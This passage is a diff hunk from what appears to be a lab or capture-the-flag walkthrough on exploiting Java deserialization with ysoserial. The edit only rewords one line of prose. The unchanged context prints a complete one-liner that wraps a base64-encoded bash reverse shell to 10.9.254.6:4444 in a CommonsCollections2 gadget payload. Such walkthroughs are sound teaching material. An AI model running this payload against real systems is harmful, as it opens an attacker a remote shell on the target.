@@ -196,7 +196,7 @@ We are now set up to attempt to exploit this vulnerability using the `ysoserial`
 
 ### YSOSerial Reverse Shell
 
-We can generate a reverse shell payload inside a `ysoserial` payload:
+We can generate a reverse shell payload inside a `ysoserial` payload with a bit of bash wizardry (you can do this using manual steps):
 
 ```
 payload=`echo "bash -i >& /dev/tcp/10.9.254.6/4444 0>&1" | base64 -w0`;java -jar ysoserial-all.jar CommonsCollections2 "bash -c {echo,$payload}|{base64,-d}|{bash,-i}" | base64 -w0
